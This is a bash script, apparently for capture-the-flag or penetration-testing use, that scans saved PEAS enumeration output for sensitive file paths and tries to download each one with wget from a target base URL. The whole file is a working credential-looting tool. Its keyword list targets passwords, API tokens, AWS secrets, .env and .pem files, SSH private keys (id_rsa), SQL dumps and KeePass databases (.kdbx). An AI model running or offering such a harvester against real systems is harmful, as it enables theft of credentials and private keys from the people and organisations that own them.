#!/bin/bash

show_help() {
    echo "Usage: $0 [options] <peas_output_file>"
    echo ""
    echo "Options:"
    echo "  -d <dir>       Directory to save downloaded files (default: ./downloads)"
    echo "  -u <url>       Base URL or IP to prepend for wget (e.g., http://10.10.10.10)"
    echo "  -h             Show this help message"
    echo ""
    echo "Example:"
    echo "  $0 -d loot -u http://10.10.10.10 peas-output.txt"
    exit 0
}

# Defaults
DOWNLOAD_DIR="./downloads"
BASE_URL=""
KEYWORDS='(?i)password|apikey|token|aws|secret|\.env|\.pem|id_rsa|\.sql|\.kdbx|\.log|\.config'

while getopts ":d:u:h" opt; do
    case $opt in
        d) DOWNLOAD_DIR="$OPTARG" ;;
        u) BASE_URL="$OPTARG" ;;
        h) show_help ;;
        \?) echo "Invalid option -$OPTARG"; show_help ;;
    esac
done

shift $((OPTIND - 1))

PEAS_FILE="$1"

if [[ -z "$PEAS_FILE" || ! -f "$PEAS_FILE" ]]; then
    echo "[-] Error: PEAS output file not specified or doesn't exist."
    show_help
    exit 1
fi

mkdir -p "$DOWNLOAD_DIR"

echo "[*] Scanning $PEAS_FILE for sensitive file references..."

# Extract suspicious lines
grep -E "$KEYWORDS" "$PEAS_FILE" | tee "$DOWNLOAD_DIR/matches.txt"

# Try to extract file paths
echo "[*] Extracting potential file paths..."

grep -E "$KEYWORDS" "$PEAS_FILE" | grep -oE "/[a-zA-Z0-9_\-/.]*" | sort -u > "$DOWNLOAD_DIR/found_paths.txt"

echo "[+] Found $(wc -l < "$DOWNLOAD_DIR/found_paths.txt") possible paths."

# Downloading
if [[ -n "$BASE_URL" ]]; then
    echo "[*] Attempting downloads via wget..."

    while read -r path; do
        clean_path=$(echo "$path" | sed 's|^/||')  # remove leading /
        full_url="${BASE_URL}/${clean_path}"

        echo "[>] Trying: $full_url"
        wget -q --no-check-certificate -P "$DOWNLOAD_DIR" "$full_url" && \
            echo "[+] Downloaded: $full_url" >> "$DOWNLOAD_DIR/success.log"
    done < "$DOWNLOAD_DIR/found_paths.txt"

    echo "[*] Download complete. Saved to $DOWNLOAD_DIR"
fi
echo "[*] Scan complete. Check $DOWNLOAD_DIR for results."
